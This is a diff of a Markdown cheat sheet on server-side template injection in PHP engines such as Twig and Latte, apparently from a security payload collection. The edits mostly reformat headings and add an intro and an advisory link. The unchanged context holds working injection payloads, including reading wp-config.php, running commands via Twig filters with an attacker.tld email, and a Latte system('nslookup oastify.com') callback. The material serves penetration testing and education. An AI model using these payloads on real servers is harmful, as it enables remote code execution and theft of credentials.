@@ -1,22 +1,23 @@
 # Server Side Template Injection - PHP
 
+> Server-Side Template Injection (SSTI)  is a vulnerability that occurs when an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary commands on the server. In PHP, SSTI can arise when user input is embedded within templates rendered by templating engines like Smarty, Twig, or even within plain PHP templates, without proper sanitization or validation.
+
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
 - [Smarty](#smarty)
 - [Twig](#twig)
-    - [Twig - Basic injection](#twig---basic-injection)
-    - [Twig - Template format](#twig---template-format)
+    - [Twig - Basic Injection](#twig---basic-injection)
+    - [Twig - Template Format](#twig---template-format)
     - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
-    - [Twig - Code execution](#twig---code-execution)
+    - [Twig - Code Execution](#twig---code-execution)
 - [Latte](#latte)
-    - [Latte - Basic injection](#latte---basic-injection)
-    - [Latte - Code execution](#latte---code-execution)
+    - [Latte - Basic Injection](#latte---basic-injection)
+    - [Latte - Code Execution](#latte---code-execution)
 - [patTemplate](#pattemplate)
 - [PHPlib](#phplib-and-html_template_phplib)
 - [Plates](#plates)
 - [References](#references)
-
 
 ## Templating Libraries
 
@@ -28,7 +29,6 @@
 | Plates         | `<?= ?>`  |
 | Smarty         | `{ }`     |
 | Twig           | `{{ }}`   |
-
 
 ## Smarty
 
@@ -50,7 +50,7 @@
 [Official website](https://twig.symfony.com/)
 > Twig is a modern template engine for PHP.
 
-### Twig - Basic injection
+### Twig - Basic Injection
 
 ```python
 {{7*7}}
@@ -60,7 +60,7 @@
 {{app.request.server.all|join(',')}}
 ```
 
-### Twig - Template format
+### Twig - Template Format
 
 ```python
 $output = $twig > render (
@@ -81,7 +81,7 @@ $output = $twig > render (
 {{include("wp-config.php")}}
 ```
 
-### Twig - Code execution
+### Twig - Code Execution
 
 ```python
 {{self}}
@@ -115,20 +115,19 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ## Latte
 
-### Latte - Basic injection
+### Latte - Basic Injection
 
 ```php
 {var $X="POC"}{$X}
 ```
 
-### Latte - Code execution
+### Latte - Code Execution
 
 ```php
 {php system('nslookup oastify.com')}
 ```
 
 ---
-
 
 ## patTemplate
 
@@ -248,7 +247,6 @@ layout template:
 </html>
 ```
 
-
 ## References
 
-* [TODO](#todo)
+- [Server Side Template Injection (SSTI) via Twig escape handler - March 21, 2024](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)
